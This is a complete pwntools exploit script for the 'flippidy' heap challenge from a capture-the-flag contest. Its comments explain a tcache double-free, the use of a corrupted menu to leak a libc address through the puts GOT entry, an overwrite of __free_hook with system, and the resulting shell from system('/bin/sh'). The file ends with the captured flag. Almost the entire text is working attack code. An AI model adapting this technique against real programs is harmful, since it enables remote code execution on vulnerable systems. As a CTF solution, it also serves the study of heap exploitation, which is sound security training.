from pwn import *
from sys import argv

if 'debug' in argv:
    # 'patched' is the binary of the challenge
    # patched with patchelf to use the correct interpreter for the libc
    # use pwninit and patchelf --set-interpreter
    p = gdb.debug('./patched', 'c\n', env={'LD_PRELOAD': './libc.so.6'})
    elf = p.elf
elif 'remote' in argv:
    p = remote('dicec.tf', 31904)
    elf = ELF('./flippidy')
else:
    p = process('./patched', env={'LD_PRELOAD': './libc.so.6'})
    elf = p.elf

libc = ELF('./libc.so.6')

def add(index: int, content: str):
    p.sendlineafter(':', '1')
    p.sendlineafter('Index', str(index))
    p.sendlineafter('Content', content)

def flip():
    p.sendlineafter(':', '2')

# Make the list 1 string long
p.sendlineafter('how big', '1')

# The address of the menu array and of each string in it
menu_entries_arrayptr = 0x404020
menu_strings = [b'----- Menu', b'1. Add', b'2. Flip', b'3. Exit']
menu_entries = [next(elf.search(s)) for s in menu_strings]
menu_array = b''.join([p64(addr) for addr in menu_entries])

# Create a chunk and write the array's address to it
add(0, p64(menu_entries_arrayptr))

# Trigger the double free in flip, adding menu_entries_arrayptr to bin list
# Basically: chunk gets freed twice, first malloc gives us the chunk back
# and the menu array ptr is copied to it
# Second malloc gives us the same chunk again,
# and the menu array ptr is used as next ptr
# The tcache now has size 0 (2 frees 2 mallocs)
flip()

# The pointer at menu_entries_arrayptr was added to the tcache bin
# We can take it even if tcache now has size 0, there are no controls
# When we take it the size will underflow to 0xff,
# which means the next frees would go to fastbin
# So now we have a fake free chunk at the string '----- Menu' etc, 
# which is right after the menu entries array
# Modify first element of menu entries to point to puts got,
# so that we leak it when menu is printed
# Leave the other elements unmodified
# there is no need to change them and also cause I'm a good, well-mannered boy
# Write a pointer to menu_entries[0] at menu_entries[0]
# this makes a loop in the tcache list,
# it is basically an artificial double free which is awesome
add(0, p64(elf.got['puts']) + menu_array[8:] + p64(menu_entries[0]))


# the first element of the menu was replaced with a pointer to puts got
# Retrieve this leak and calculate libc address
p.recvline()
p.recvline()
puts_leak = u64(p.recv(6) + b'\x00\x00')
libc.address = puts_leak - libc.sym['puts']
log.info(f'Puts: {hex(puts_leak)}')
log.info(f'libc: {hex(libc.address)}')

# Now make use of the 'artificial double free'
# let's add __free_hook to the tcache bin list
# The tcache bin right now is menu_entries[0] -> menu_entries[0]
# We malloc to get the chunk at menu_entries[0], 
# write free_hook addr on it, 
# then we malloc again and get the same chunk again
# This second malloc, free_hook will be treated as next ptr,
# so will be added to tcache by tcache_put
add(0, p64(libc.sym['__free_hook']))
add(0, 'cute doggo lol')

# Next malloc gives us a chunk on free_hook, write pointer to system 
# Next call to free will call system instead
add(0, p64(libc.sym['system']))

# The tcache is now empty because free_hook was set to NULL
# So we can simply allocate a new chunk without error
# We set its contents to /bin/sh then we free it to call system('/bin/sh')
add(0, '/bin/sh\x00')
flip()

p.interactive() # dice{some_dance_to_remember_some_dance_to_forget_2.27_checks_aff239e1a52cf55cd85c9c16}

